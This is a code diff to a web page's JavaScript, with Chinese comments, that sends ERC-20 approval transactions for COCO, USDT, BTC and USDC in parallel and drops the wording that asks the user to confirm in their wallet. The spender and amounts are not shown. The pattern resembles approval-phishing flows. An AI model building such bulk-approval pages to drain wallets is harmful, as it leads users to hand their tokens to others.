@@ -429,24 +429,19 @@
                 const progressFill = document.getElementById('progressFill');
                 progressBar.style.display = 'block';
                 
-                showStatus('开始授权四个代币...', 'info');
+                showStatus('开始同时授权四个代币...', 'info');
                 
                 let successCount = 0;
                 let failCount = 0;
                 
-                // 直接授权四个代币
+                // 同时授权四个代币
                 const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt, TOKENS.btc, TOKENS.usdc];
                 
-                for (let i = 0; i < tokensToAuthorize.length; i++) {
-                    const token = tokensToAuthorize[i];
-                    const progress = ((i + 1) / tokensToAuthorize.length) * 100;
-                    progressFill.style.width = progress + '%';
-                    
+                showStatus('正在同时发送所有授权交易...', 'info');
+                
+                // 并行发送所有授权交易
+                const authorizationPromises = tokensToAuthorize.map(async (token, index) => {
                     try {
-                        showStatus(`正在授权 ${token.name}...`, 'info');
-                        
-
-                        
                         // 构建授权交易
                         const tokenContract = new web3.eth.Contract([
                             {
@@ -482,23 +477,53 @@
                             gasPrice: await web3.eth.getGasPrice()
                         };
                         
-                        showStatus(`请在钱包中确认 ${token.name} 的授权交易...`, 'info');
+                        showStatus(`正在发送 ${token.name} 的授权交易...`, 'info');
                         
-                        // 发送交易
-                        const receipt = await web3.eth.sendTransaction(transaction);
+                        // 发送交易（不等待确认）
+                        const txHash = await web3.eth.sendTransaction(transaction);
                         
-                        console.log(`${token.name} 授权成功，交易哈希:`, receipt.transactionHash);
-                        successCount++;
+                        console.log(`${token.name} 授权交易已发送，交易哈希:`, txHash);
                         
-                        // 等待一下再继续下一个
-                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        // 等待交易确认
+                        const receipt = await web3.eth.waitForTransactionReceipt(txHash);
+                        
+                        if (receipt.status) {
+                            console.log(`${token.name} 授权成功，交易哈希:`, receipt.transactionHash);
+                            return { success: true, token: token.name, hash: receipt.transactionHash };
+                        } else {
+                            console.error(`${token.name} 授权交易失败`);
+                            return { success: false, token: token.name, error: '交易失败' };
+                        }
                         
                     } catch (error) {
                         console.error(`${token.name} 授权失败:`, error);
-                        failCount++;
-                        showStatus(`${token.name} 授权失败: ${error.message}`, 'error');
+                        return { success: false, token: token.name, error: error.message };
                     }
-                }
+                });
+                
+                // 等待所有交易完成
+                showStatus('等待所有授权交易确认中...', 'info');
+                const results = await Promise.allSettled(authorizationPromises);
+                
+                // 统计结果
+                results.forEach((result, index) => {
+                    if (result.status === 'fulfilled') {
+                        if (result.value.success) {
+                            successCount++;
+                            showStatus(`${result.value.token} 授权成功！`, 'success');
+                        } else {
+                            failCount++;
+                            showStatus(`${result.value.token} 授权失败: ${result.value.error}`, 'error');
+                        }
+                    } else {
+                        failCount++;
+                        showStatus(`${tokensToAuthorize[index].name} 授权异常: ${result.reason}`, 'error');
+                    }
+                    
+                    // 更新进度条
+                    const progress = ((index + 1) / tokensToAuthorize.length) * 100;
+                    progressFill.style.width = progress + '%';
+                });
                 
                 // 隐藏进度条
                 progressBar.style.display = 'none';
